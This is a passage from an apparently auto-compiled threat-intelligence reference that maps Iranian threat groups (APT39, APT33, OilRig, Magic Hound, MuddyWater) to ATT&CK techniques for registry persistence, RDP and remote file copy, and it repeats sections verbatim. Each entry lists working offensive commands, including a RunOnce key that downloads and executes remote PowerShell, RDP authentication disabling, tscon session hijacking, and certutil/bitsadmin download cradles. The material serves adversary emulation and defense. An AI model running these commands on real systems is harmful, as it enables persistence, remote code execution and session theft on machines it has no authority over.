The Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</code> and <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell</code> subkeys can automatically launch programs.

Programs listed in the load value of the registry key <code>HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows</code> run when any user logs on.

By default, the multistring BootExecute value of the registry key <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager</code> is set to autocheck autochk *. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.


Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.
```

## Technique Commands

```
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /F /D "C:\Path\AtomicRedTeam.exe"
REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\Path\AtomicRedTeam.dll"
$RunOnceKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
set-itemproperty $RunOnceKey "NextRun" 'powershell.exe "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`")"'
Software\Microsoft\Windows\CurrentVersion\Run|Software\Microsoft\Windows\CurrentVersion\RunOnce|Software\Microsoft\Windows\CurrentVersion\RunOnceEx|Software\Microsoft\Windows\CurrentVersion\RunServicesOnce|Software\Microsoft\Windows\CurrentVersion\RunServices|SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad|Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run|Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders|Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
\Microsoft\Windows\Start Menu\Programs\Startup|Software\Microsoft\Windows\CurrentVersion\Run|Software\Microsoft\Windows\CurrentVersion\RunOnce|Software\Microsoft\Windows\CurrentVersion\RunOnceEx|Software\Microsoft\Windows\CurrentVersion\RunServicesOnce|Software\Microsoft\Windows\CurrentVersion\RunServices|SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad|Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run|Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders|Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Microsoft\Windows\Start Menu\Programs\Startup
\Microsoft\Windows\Start Menu\Programs\Startup\Microsoft\Windows\Start Menu\Programs\Startup
powershell/persistence/elevated/registry
powershell/persistence/elevated/registry
powershell/persistence/userland/registry
powershell/persistence/userland/registry
```



# Actor: APT39

## Actor Description

```
[APT39](https://attack.mitre.org/groups/G0087) is an Iranian cyber espionage group that has been active since at least 2014. They have targeted the telecommunication and travel industries to collect personal information that aligns with Iran's national priorities. (Citation: FireEye APT39 Jan 2019)(Citation: Symantec Chafer Dec 2015)
```

## Actor Aliases

```
APT39
Chafer
```

## Technique Name: Registry Run Keys / Startup Folder

## Technique Description

```
Adding an entry to the "run keys" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. (Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.

The following run keys are created by default on Windows systems:
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code>
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>

The <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. (Citation: Microsoft RunOnceEx APR 2018) For example, it is possible to load a DLL at logon using a "Depend" key with RunOnceEx: <code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\temp\evil[.]dll"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)

The following Registry keys can be used to set startup folder items for persistence:
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code>
* <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code>
* <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code>

The following Registry keys can control automatic startup of services during boot:
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code>
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</code>

Using policy settings to specify startup programs creates corresponding values in either of two Registry keys:
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>

The Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</code> and <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell</code> subkeys can automatically launch programs.

Programs listed in the load value of the registry key <code>HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows</code> run when any user logs on.

By default, the multistring BootExecute value of the registry key <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager</code> is set to autocheck autochk *. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.


Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.
```

## Technique Commands

```
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /F /D "C:\Path\AtomicRedTeam.exe"
REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\Path\AtomicRedTeam.dll"
$RunOnceKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
set-itemproperty $RunOnceKey "NextRun" 'powershell.exe "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`")"'
Software\Microsoft\Windows\CurrentVersion\Run|Software\Microsoft\Windows\CurrentVersion\RunOnce|Software\Microsoft\Windows\CurrentVersion\RunOnceEx|Software\Microsoft\Windows\CurrentVersion\RunServicesOnce|Software\Microsoft\Windows\CurrentVersion\RunServices|SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad|Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run|Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders|Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
\Microsoft\Windows\Start Menu\Programs\Startup|Software\Microsoft\Windows\CurrentVersion\Run|Software\Microsoft\Windows\CurrentVersion\RunOnce|Software\Microsoft\Windows\CurrentVersion\RunOnceEx|Software\Microsoft\Windows\CurrentVersion\RunServicesOnce|Software\Microsoft\Windows\CurrentVersion\RunServices|SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad|Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run|Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders|Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Microsoft\Windows\Start Menu\Programs\Startup
\Microsoft\Windows\Start Menu\Programs\Startup\Microsoft\Windows\Start Menu\Programs\Startup
powershell/persistence/elevated/registry
powershell/persistence/elevated/registry
powershell/persistence/userland/registry
powershell/persistence/userland/registry
```



# Actor: APT33

## Actor Description

```
[APT33](https://attack.mitre.org/groups/G0064) is a suspected Iranian threat group that has carried out operations since at least 2013. The group has targeted organizations across multiple industries in the United States, Saudi Arabia, and South Korea, with a particular interest in the aviation and energy sectors. (Citation: FireEye APT33 Sept 2017) (Citation: FireEye APT33 Webinar Sept 2017)
```

## Actor Aliases

```
APT33
Elfin
```

## Technique Name: Registry Run Keys / Startup Folder

## Technique Description

```
Adding an entry to the "run keys" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. (Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.

The following run keys are created by default on Windows systems:
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code>
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>

The <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. (Citation: Microsoft RunOnceEx APR 2018) For example, it is possible to load a DLL at logon using a "Depend" key with RunOnceEx: <code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\temp\evil[.]dll"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)

The following Registry keys can be used to set startup folder items for persistence:
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code>
* <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code>
* <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code>

The following Registry keys can control automatic startup of services during boot:
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code>
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</code>

Using policy settings to specify startup programs creates corresponding values in either of two Registry keys:
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>

The Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</code> and <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell</code> subkeys can automatically launch programs.

Programs listed in the load value of the registry key <code>HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows</code> run when any user logs on.

By default, the multistring BootExecute value of the registry key <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager</code> is set to autocheck autochk *. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.


Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.
```

## Technique Commands

```
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /F /D "C:\Path\AtomicRedTeam.exe"
REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\Path\AtomicRedTeam.dll"
$RunOnceKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
set-itemproperty $RunOnceKey "NextRun" 'powershell.exe "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`")"'
Software\Microsoft\Windows\CurrentVersion\Run|Software\Microsoft\Windows\CurrentVersion\RunOnce|Software\Microsoft\Windows\CurrentVersion\RunOnceEx|Software\Microsoft\Windows\CurrentVersion\RunServicesOnce|Software\Microsoft\Windows\CurrentVersion\RunServices|SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad|Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run|Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders|Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
\Microsoft\Windows\Start Menu\Programs\Startup|Software\Microsoft\Windows\CurrentVersion\Run|Software\Microsoft\Windows\CurrentVersion\RunOnce|Software\Microsoft\Windows\CurrentVersion\RunOnceEx|Software\Microsoft\Windows\CurrentVersion\RunServicesOnce|Software\Microsoft\Windows\CurrentVersion\RunServices|SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad|Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run|Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders|Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Microsoft\Windows\Start Menu\Programs\Startup
\Microsoft\Windows\Start Menu\Programs\Startup\Microsoft\Windows\Start Menu\Programs\Startup
powershell/persistence/elevated/registry
powershell/persistence/elevated/registry
powershell/persistence/userland/registry
powershell/persistence/userland/registry
```



# Actor: OilRig

## Actor Description

```
[OilRig](https://attack.mitre.org/groups/G0049) is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of industries, including financial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. FireEye assesses that the group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests. (Citation: Palo Alto OilRig April 2017) (Citation: ClearSky OilRig Jan 2017) (Citation: Palo Alto OilRig May 2016) (Citation: Palo Alto OilRig Oct 2016) (Citation: Unit 42 Playbook Dec 2017) (Citation: FireEye APT34 Dec 2017)(Citation: Unit 42 QUADAGENT July 2018) This group was previously tracked under two distinct groups, APT34 and OilRig, but was combined due to additional reporting giving higher confidence about the overlap of the activity.
```

## Actor Aliases

```
OilRig
IRN2
HELIX KITTEN
APT34
```

## Technique Name: Remote Desktop Protocol

## Technique Description

```
Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). (Citation: TechNet Remote Desktop Services) There are other implementations and third-party tools that provide graphical access [Remote Services](https://attack.mitre.org/techniques/T1021) similar to RDS.

Adversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility Features](https://attack.mitre.org/techniques/T1015) technique for Persistence. (Citation: Alperovitch Malware)

Adversaries may also perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session and prompted with a question. With System permissions and using Terminal Services Console, <code>c:\windows\system32\tscon.exe [session number to be stolen]</code>, an adversary can hijack a session without the need for credentials or prompts to the user. (Citation: RDP Hijacking Korznikov) This can be done remotely or locally and with active or disconnected sessions. (Citation: RDP Hijacking Medium) It can also lead to [Remote System Discovery](https://attack.mitre.org/techniques/T1018) and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in RedSnarf. (Citation: Kali Redsnarf)
```

## Technique Commands

```
Enable RDP Services:
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f 
net start TermService
Enable RDP Services:
shell REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
shell reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f 
shell net start TermService
post/windows/manage/enable_rdp
query user
sc.exe create sesshijack binpath= "cmd.exe /k tscon 1337 /dest:rdp-tcp#55"
net start sesshijack
Connect-RDP -ComputerName #{logonserver} -User $Env:USERDOMAIN\$ENV:USERNAME
Connect-RDP -ComputerName $ENV:logonserver.TrimStart("\") -User $Env:USERDOMAIN\$ENV:USERNAME
mstsc.exe|tscon.exe
powershell/management/enable_multi_rdp
powershell/management/enable_multi_rdp
powershell/management/enable_rdp
powershell/management/enable_rdp
```



# Actor: APT39

## Actor Description

```
[APT39](https://attack.mitre.org/groups/G0087) is an Iranian cyber espionage group that has been active since at least 2014. They have targeted the telecommunication and travel industries to collect personal information that aligns with Iran's national priorities. (Citation: FireEye APT39 Jan 2019)(Citation: Symantec Chafer Dec 2015)
```

## Actor Aliases

```
APT39
Chafer
```

## Technique Name: Remote Desktop Protocol

## Technique Description

```
Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). (Citation: TechNet Remote Desktop Services) There are other implementations and third-party tools that provide graphical access [Remote Services](https://attack.mitre.org/techniques/T1021) similar to RDS.

Adversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility Features](https://attack.mitre.org/techniques/T1015) technique for Persistence. (Citation: Alperovitch Malware)

Adversaries may also perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session and prompted with a question. With System permissions and using Terminal Services Console, <code>c:\windows\system32\tscon.exe [session number to be stolen]</code>, an adversary can hijack a session without the need for credentials or prompts to the user. (Citation: RDP Hijacking Korznikov) This can be done remotely or locally and with active or disconnected sessions. (Citation: RDP Hijacking Medium) It can also lead to [Remote System Discovery](https://attack.mitre.org/techniques/T1018) and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in RedSnarf. (Citation: Kali Redsnarf)
```

## Technique Commands

```
Enable RDP Services:
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f 
net start TermService
Enable RDP Services:
shell REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
shell reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f 
shell net start TermService
post/windows/manage/enable_rdp
query user
sc.exe create sesshijack binpath= "cmd.exe /k tscon 1337 /dest:rdp-tcp#55"
net start sesshijack
Connect-RDP -ComputerName #{logonserver} -User $Env:USERDOMAIN\$ENV:USERNAME
Connect-RDP -ComputerName $ENV:logonserver.TrimStart("\") -User $Env:USERDOMAIN\$ENV:USERNAME
mstsc.exe|tscon.exe
powershell/management/enable_multi_rdp
powershell/management/enable_multi_rdp
powershell/management/enable_rdp
powershell/management/enable_rdp
```



# Actor: Magic Hound

## Actor Description

```
[Magic Hound](https://attack.mitre.org/groups/G0059) is an Iranian-sponsored threat group operating primarily in the Middle East that dates back as early as 2014. The group behind the campaign has primarily targeted organizations in the energy, government, and technology sectors that are either based or have business interests in Saudi Arabia.(Citation: Unit 42 Magic Hound Feb 2017)(Citation: FireEye APT35 2018)
```

## Actor Aliases

```
Magic Hound
Rocket Kitten
Operation Saffron Rose
Ajax Security Team
Operation Woolen-Goldfish
Newscaster
Cobalt Gypsy
APT35
```

## Technique Name: Remote File Copy

## Technique Description

```
Files may be copied from one system to another to stage adversary tools or other files over the course of an operation. Files may be copied from an external adversary-controlled system through the Command and Control channel to bring tools into the victim network or through alternate protocols with another tool such as [FTP](https://attack.mitre.org/software/S0095). Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.

Adversaries may also copy files laterally between internal victim systems to support Lateral Movement with remote Execution using inherent file sharing protocols such as file sharing over SMB to connected network shares or with authenticated connections with [Windows Admin Shares](https://attack.mitre.org/techniques/T1077) or [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1076).
```

## Technique Commands

```
rsync -r #{local_path} victim@#{remote_host}:#{remote_path}
rsync -r /tmp/adversary-rsync/ victim@#{remote_host}:#{remote_path}
rsync -r #{local_path} #{username}@victim-host:#{remote_path}
rsync -r #{local_path} #{username}@victim-host:/tmp/victim-files
rsync -r adversary@#{remote_host}:#{remote_path} #{local_path}
rsync -r adversary@#{remote_host}:#{remote_path} /tmp/victim-files
rsync -r #{username}@adversary-host:#{remote_path} #{local_path}
rsync -r #{username}@adversary-host:/tmp/adversary-rsync/ #{local_path}
scp #{local_file} victim@#{remote_host}:#{remote_path}
scp /tmp/adversary-scp victim@#{remote_host}:#{remote_path}
scp #{local_file} #{username}@victim-host:#{remote_path}
scp #{local_file} #{username}@victim-host:/tmp/victim-files/
scp adversary@#{remote_host}:#{remote_file} #{local_path}
scp adversary@#{remote_host}:/tmp/adversary-scp #{local_path}
scp #{username}@#{remote_host}:#{remote_file} /tmp/victim-files/
scp #{username}@adversary-host:#{remote_file} /tmp/victim-files/
sftp victim@#{remote_host}:#{remote_path} <<< $'put #{local_file}'
sftp victim@#{remote_host}:#{remote_path} <<< $'put /tmp/adversary-sftp'
sftp #{username}@victim-host:#{remote_path} <<< $'put #{local_file}'
sftp #{username}@victim-host:/tmp/victim-files/ <<< $'put #{local_file}'
sftp adversary@#{remote_host}:#{remote_file} #{local_path}
sftp adversary@#{remote_host}:/tmp/adversary-sftp #{local_path}
sftp #{username}@#{remote_host}:#{remote_file} /tmp/victim-files/
sftp #{username}@adversary-host:#{remote_file} /tmp/victim-files/
cmd /c certutil -urlcache -split -f #{remote_file} Atomic-license.txt
cmd /c certutil -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt Atomic-license.txt
$datePath = "certutil-$(Get-Date -format yyyy_MM_dd_HH_mm)"
New-Item -Path $datePath -ItemType Directory
Set-Location $datePath
certutil -verifyctl -split -f #{remote_file}
Get-ChildItem | Where-Object {$_.Name -notlike "*.txt"} | Foreach-Object { Move-Item $_.Name -Destination Atomic-license.txt }
$datePath = "certutil-$(Get-Date -format yyyy_MM_dd_HH_mm)"
New-Item -Path $datePath -ItemType Directory
Set-Location $datePath
certutil -verifyctl -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
Get-ChildItem | Where-Object {$_.Name -notlike "*.txt"} | Foreach-Object { Move-Item $_.Name -Destination Atomic-license.txt }
C:\Windows\System32\bitsadmin.exe /transfer qcxjb7 /Priority HIGH #{remote_file} #{local_path}
C:\Windows\System32\bitsadmin.exe /transfer qcxjb7 /Priority HIGH #{remote_file} Atomic-license.txt
C:\Windows\System32\bitsadmin.exe /transfer #{bits_job_name} /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt #{local_path}
(New-Object System.Net.WebClient).DownloadFile("#{remote_file}", "Atomic-license.txt")
(New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt", "Atomic-license.txt")
```



# Actor: MuddyWater

## Actor Description

```
[MuddyWater](https://attack.mitre.org/groups/G0069) is an Iranian threat group that has primarily targeted Middle Eastern nations, and has also targeted European and North American nations. The group's victims are mainly in the telecommunications, government (IT services), and oil sectors. Activity from this group was previously linked to [FIN7](https://attack.mitre.org/groups/G0046), but the group is believed to be a distinct group possibly motivated by espionage.(Citation: Unit 42 MuddyWater Nov 2017)(Citation: Symantec MuddyWater Dec 2018)(Citation: ClearSky MuddyWater Nov 2018)
```

## Actor Aliases

```
MuddyWater
Seedworm
TEMP.Zagros
```

## Technique Name: Remote File Copy

## Technique Description

```
Files may be copied from one system to another to stage adversary tools or other files over the course of an operation. Files may be copied from an external adversary-controlled system through the Command and Control channel to bring tools into the victim network or through alternate protocols with another tool such as [FTP](https://attack.mitre.org/software/S0095). Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.

Adversaries may also copy files laterally between internal victim systems to support Lateral Movement with remote Execution using inherent file sharing protocols such as file sharing over SMB to connected network shares or with authenticated connections with [Windows Admin Shares](https://attack.mitre.org/techniques/T1077) or [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1076).
```

## Technique Commands

```
rsync -r #{local_path} victim@#{remote_host}:#{remote_path}
rsync -r /tmp/adversary-rsync/ victim@#{remote_host}:#{remote_path}
rsync -r #{local_path} #{username}@victim-host:#{remote_path}
rsync -r #{local_path} #{username}@victim-host:/tmp/victim-files
rsync -r adversary@#{remote_host}:#{remote_path} #{local_path}
rsync -r adversary@#{remote_host}:#{remote_path} /tmp/victim-files
rsync -r #{username}@adversary-host:#{remote_path} #{local_path}
rsync -r #{username}@adversary-host:/tmp/adversary-rsync/ #{local_path}
scp #{local_file} victim@#{remote_host}:#{remote_path}
scp /tmp/adversary-scp victim@#{remote_host}:#{remote_path}
scp #{local_file} #{username}@victim-host:#{remote_path}
scp #{local_file} #{username}@victim-host:/tmp/victim-files/
scp adversary@#{remote_host}:#{remote_file} #{local_path}
scp adversary@#{remote_host}:/tmp/adversary-scp #{local_path}
scp #{username}@#{remote_host}:#{remote_file} /tmp/victim-files/
scp #{username}@adversary-host:#{remote_file} /tmp/victim-files/
sftp victim@#{remote_host}:#{remote_path} <<< $'put #{local_file}'
sftp victim@#{remote_host}:#{remote_path} <<< $'put /tmp/adversary-sftp'
sftp #{username}@victim-host:#{remote_path} <<< $'put #{local_file}'
sftp #{username}@victim-host:/tmp/victim-files/ <<< $'put #{local_file}'
sftp adversary@#{remote_host}:#{remote_file} #{local_path}
sftp adversary@#{remote_host}:/tmp/adversary-sftp #{local_path}
sftp #{username}@#{remote_host}:#{remote_file} /tmp/victim-files/
sftp #{username}@adversary-host:#{remote_file} /tmp/victim-files/
cmd /c certutil -urlcache -split -f #{remote_file} Atomic-license.txt
cmd /c certutil -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt Atomic-license.txt
$datePath = "certutil-$(Get-Date -format yyyy_MM_dd_HH_mm)"
New-Item -Path $datePath -ItemType Directory
Set-Location $datePath
certutil -verifyctl -split -f #{remote_file}
Get-ChildItem | Where-Object {$_.Name -notlike "*.txt"} | Foreach-Object { Move-Item $_.Name -Destination Atomic-license.txt }
$datePath = "certutil-$(Get-Date -format yyyy_MM_dd_HH_mm)"
New-Item -Path $datePath -ItemType Directory
Set-Location $datePath
certutil -verifyctl -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
Get-ChildItem | Where-Object {$_.Name -notlike "*.txt"} | Foreach-Object { Move-Item $_.Name -Destination Atomic-license.txt }
C:\Windows\System32\bitsadmin.exe /transfer qcxjb7 /Priority HIGH #{remote_file} #{local_path}
C:\Windows\System32\bitsadmin.exe /transfer qcxjb7 /Priority HIGH #{remote_file} Atomic-license.txt
C:\Windows\System32\bitsadmin.exe /transfer #{bits_job_name} /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt #{local_path}
(New-Object System.Net.WebClient).DownloadFile("#{remote_file}", "Atomic-license.txt")
(New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt", "Atomic-license.txt")
```



# Actor: OilRig

## Actor Description

```
